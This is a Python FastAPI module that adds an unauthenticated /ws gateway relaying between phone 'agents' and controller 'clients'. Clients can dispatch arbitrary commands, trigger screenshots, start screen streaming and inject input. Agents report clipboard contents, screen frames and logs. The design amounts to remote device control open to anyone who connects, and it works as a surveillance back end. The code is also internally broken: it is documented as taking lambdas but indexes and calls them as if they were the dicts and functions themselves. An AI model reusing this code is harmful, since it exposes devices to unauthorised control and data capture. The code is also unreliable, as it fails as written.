# -*- coding: utf-8 -*-
"""Cinder WebSocket 兼容层

给 APK 用的 /ws 端点。APK 发的是 {"t":"cmd","d":{...}} 简写格式，
后端内部原有协议是 {"type":"cmd",...}，这里做翻译，直接复用
main.py 里已有的 AGENTS / FRAMES / CMDS / REC / _dispatch / _health。

挂载方式（main.py 末尾）：
    from ws_compat import register as _ws_compat_register
    _ws_compat_register(app, lambda: AGENTS, lambda: FRAMES, lambda: CMDS,
                        lambda: REC, lambda: _log, lambda: _dispatch, lambda: _health)
"""
import time
from fastapi import WebSocket, WebSocketDisconnect

CLIENTS: set = set()


def register(app, get_agents, get_frames, get_cmds, get_rec,
             get_log, get_dispatch, get_health):
    AGENTS = get_agents      # dict[name] -> WebSocket
    FRAMES = get_frames      # dict[name] -> bytes(jpeg)
    CMDS   = get_cmds        # dict[name] -> list[dict]
    REC    = get_rec         # dict[name] -> dict
    _log   = get_log         # callable(str)
    _dispatch = get_dispatch # callable
    _health   = get_health   # callable -> dict

    async def _send(ws, obj):
        try:
            await ws.send_json(obj)
            return True
        except Exception:
            return False

    async def _broadcast_clients(obj):
        dead = []
        for c in list(CLIENTS):
            if not await _send(c, obj):
                dead.append(c)
        for d in dead:
            CLIENTS.discard(d)

    async def _handle_agent(ws, msg):
        t = msg.get("t") or msg.get("type")
        d = msg.get("d") if isinstance(msg.get("d"), dict) else {}
        aid = msg.get("id") or d.get("id") or "phone01"

        if t == "ping":
            await _send(ws, {"t": "pong"})
            return
        if t == "pong":
            return

        # 手机上报一帧（base64 jpeg）
        if t == "frame":
            raw = d.get("b64") or d.get("data") or msg.get("b64")
            if raw:
                try:
                    import base64
                    FRAMES[aid] = base64.b64decode(raw)
                except Exception as e:
                    _log(f"frame decode fail: {e}")
            return

        if t == "hello" or t == "register":
            AGENTS[aid] = ws
            await _send(ws, {"t": "registered", "id": aid})
            await _broadcast_clients({"t": "agent", "d": {"online": True, "id": aid}})
            _log(f"agent online: {aid}")
            return

        if t == "result":
            await _broadcast_clients({"t": "agent", "d": {"result": d}})
            return

        if t == "log":
            _log(f"[{aid}] {d.get('msg', '')}")
            await _broadcast_clients({"t": "agent", "d": {"log": d}})
            return

        if t == "clipboard":
            await _broadcast_clients({"t": "agent", "d": {"clipboard": d}})
            return

        if t == "stats":
            await _broadcast_clients({"t": "agent", "d": {"stats": d}})
            return

    async def _handle_client(ws, msg):
        t = msg.get("t") or msg.get("type")
        d = msg.get("d") if isinstance(msg.get("d"), dict) else {}
        aid = msg.get("agent") or (d.get("id") if d else "") or "default"

        if t in ("pong", "ping"):
            return

        if t == "cmd":
            action = d.get("action") or msg.get("action") or ""
            # 关键修复：参数可能放在 args / value / text / cmd / url / number 里
            args = (d.get("args", d.get("value", d.get("text",
                    d.get("cmd", d.get("url", d.get("number", "")))))))
            r = await _dispatch(action, value=args, text=args, cmd=args,
                                url=args, _agent=aid)
            await _send(ws, {"t": "result", "d": {"action": action,
                                                  "ok": bool(r.get("ok")),
                                                  "executed": r.get("executed")}})
            return

        if t == "shot":
            target = AGENTS.get(aid) or (list(AGENTS.values())[0] if AGENTS else None)
            if target:
                await _send(target, {"t": "shot", "d": {}})
            else:
                await _send(ws, {"t": "err", "msg": "no agent online"})
            return

        if t == "stream":
            target = AGENTS.get(aid) or (list(AGENTS.values())[0] if AGENTS else None)
            if target:
                await _send(target, {"t": "stream", "d": {"on": bool(d.get("on"))}})
            else:
                await _send(ws, {"t": "err", "msg": "no agent online"})
            return

        if t == "input":
            target = AGENTS.get(aid) or (list(AGENTS.values())[0] if AGENTS else None)
            if target:
                await _send(target, {"t": "input", "d": d})
            return

    @app.websocket("/ws")
    async def ws_gateway(ws: WebSocket):
        await ws.accept()
        role = ws.query_params.get("role", "client")
        aid  = ws.query_params.get("id", "phone01")
        if role != "agent":
            CLIENTS.add(ws)
        try:
            while True:
                msg = await ws.receive_json()
                if role == "agent":
                    await _handle_agent(ws, msg)
                else:
                    await _handle_client(ws, msg)
        except WebSocketDisconnect:
            pass
        except Exception as e:
            _log(f"ws err: {e}")
        finally:
            CLIENTS.discard(ws)
            if role == "agent" and AGENTS.get(aid) is ws:
                AGENTS.pop(aid, None)
                await _broadcast_clients({"t": "agent",
                                          "d": {"online": False, "id": aid}})

    @app.get("/api/agents")
    def api_agents():
        return {"agents": list(AGENTS.keys()), "clients": len(CLIENTS),
                "ts": int(time.time())}

    _log("ws_compat mounted: /ws  /api/agents")
    return ws_gateway
